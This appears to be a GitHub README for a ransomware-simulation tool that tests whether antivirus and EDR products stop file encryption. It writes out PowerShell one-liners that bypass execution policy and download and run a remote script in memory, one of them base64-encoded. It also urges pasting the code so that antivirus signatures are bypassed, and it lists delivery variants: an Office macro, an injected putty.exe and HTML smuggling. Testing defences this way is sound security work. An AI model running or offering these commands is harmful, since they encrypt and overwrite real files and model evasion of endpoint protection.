:pushpin: :pushpin: :pushpin: Since most of binary files are being blocked by antivirus signature from time to time, please copy and paste the PowerShell code to terminal, this way can bypass antivirus signature and simulate the real ransomware behaviour :pushpin: :pushpin: :pushpin: 

![alt text](https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/Image/powershell1.gif)


# Really can protect from ransomware encryption?

We often come across antivirus and next-generation endpoint solutions that claim to offer ransomware protection, boasting advanced capabilities in detecting activities such as penetration, invasion, and pre-encryption through the use of AI and machine learning. However, these solutions may still fail to prevent the encryption process if they happen to miss detecting these malicious activities.

To address this concern, we have developed a simple tool that simulates the ransomware encryption process. This tool can help you determine whether your EDR (Endpoint Detection and Response) or antivirus software is capable of blocking such malware encryption behaviors.


[![Watch the video](https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/Image/mr.bean2.gif)](https://youtu.be/CQIq8GDtDG0)

**Stop encryption is the last defense, which cannot be neglected.**


# Which brand can detect encryption operation?

That's why I developed this tool.  It is not to replicate found malware, not vendor test tool, no bias, no need to install, just do **encrypt (in memory) - overwrite (original file) - rename (file extension)**, simulate the core operation of ransomware.

It is safe enough to run it on your working PC and server, let you see the fact in your environment.

I have helped people to test this after WannaCry outbreak.  Luckly, I found few brands can detect it, and one of them can stop ransomware encryption initiated from remote PC via file share and RDP as well.  I did see a real Ransomware incident, that endpoint really could stop encryption, no loss.

You can refer to the source code if you know programming or you can download the complied files.

Hope there is no more ransomware incident!  Please share this blog with friends if you found it is useful.


# This tool


![alt text](https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/Image/EncryptDelTestv4.1b.gif)



This tool encrypts - overwrite - rename the files in the selected (local or network) folder and subfolder, you may create a temporary folder like C:\Encrypt-Delete-Test\, save this tool to there, then run it.  Be safe.

It tests if your endpoint can detect when encryption is happening (like base on the files change pattern), but NOT to test if your endpoint can prevent it from start.

It is great if you can share your test result with me for my record.


![alt text](https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/Image/summary2.png)


EncryptDelTestv4_1.jar
- runs on Windows and Mac OS
- requires at least Java 8, http://www.java.com
(usually java.exe or javaw.exe is a trusted software, it is more difficult for endpoint to detect)


EncryptDelTestv4.1.exe / NaughtyDelTestv4.1.exe + NaughtyDelTestv4.1.dll
- runs on Windows
- requires at least .NET Framework 4.0


EncryptDelTestv4.1.ps1
- runs on Windows
- requires PowerShell


Fileless
- (download and run in memory directly) 
- powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/EncryptDelTestv4.1.ps1.txt')"
- powershell.exe -exec Bypass -noexit -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AZQBkAGQAaQBlAGMAaAB1AC8ARQBuAGMAcgB5AHAAdAAtAEQAZQBsAGUAdABlAC0AVABlAHMAdAAvAG0AYQBpAG4ALwBFAG4AYwByAHkAcAB0AEQAZQBsAFQAZQBzAHQAdgA0AC4AMQAuAHAAcwAxAC4AdAB4AHQAJwApAA==


EncryptDelTestv4.1.dll
- rundll32.exe EncryptDelTestv4.1.dll,Encrypt
- rundll32.exe EncryptDelTestv4.1.dll,Decrypt


NaughtyDelTestv4.1.xls (may be blocked by anti-virus)
- hide in Word Document


putty_naughty.exe (may be blocked by anti-virus)
- inject command in putty.exe


EncryptDelTestv4.1.html
- HTML smuggling to encode and embedded payload
- alternative download https://securitylab.pages.dev/EncryptDelTestv4.1


:pushpin: :pushpin: :pushpin: Since most of binary files are being blocked by antivirus signature from time to time, please copy and paste the PowerShell code to terminal, this way can bypass antivirus signature and simulate the real ransomware behaviour :pushpin: :pushpin: :pushpin: 


| EncryptDelTestv4_1.jar | EncryptDelTestv4.1.exe | EncryptDelTestv4.1.ps1 | 
|---------------|---------------|---------------|
|![alt text](https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/Image/screen41.gif)|![alt text](https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/Image/screen40.gif)|![alt text](https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/Image/screen43.gif)|


# How it works

###### EncryptDelTestv4.1.ps1 (local drive)

| CANNOT detect | CAN detect |
|---------------|---------------|
|![alt text](https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/Image/screen43.gif)|![alt text](https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/Image/screen55.gif)|
| The tool encrypts all files, a red page is shown and all files are encrypted | The encryption operatoin is blocked, no red page is shown, few files are encrypted, but they are being restored |


#

###### EncryptDelTestv4.1.ps1 (remote attack)

| CAN detect |
|---------------|
|![alt text](https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/Image/screen56.gif)|
![alt text](https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/Image/endpoint3.gif)
|The tool tries to encrypt files in network drive (N:\), the server the encryption operaton from remote, few files are encrypted, but they are being restored|




Archived https://github.com/eddiechu-zz/Encrypt-Delete-Test






#

ransomware test tool
ransomware simulation
ransomware simulator
ransomware assessment
eddie chu
eddiechu.android@gmail.com
anti-ransomware
antivirus test
anti-virus test
endpoint test
infosec
security
cyber security
cybersecurity
incident response
hacker
antimalware
anti-malware
encryption
encrypt-del-test
encrypt-delete-test
encryptdeltest
encrypt overwrite rename
tool
test tool
defense
testing
pentest
penetration test
blue team
red team
poc
ciso
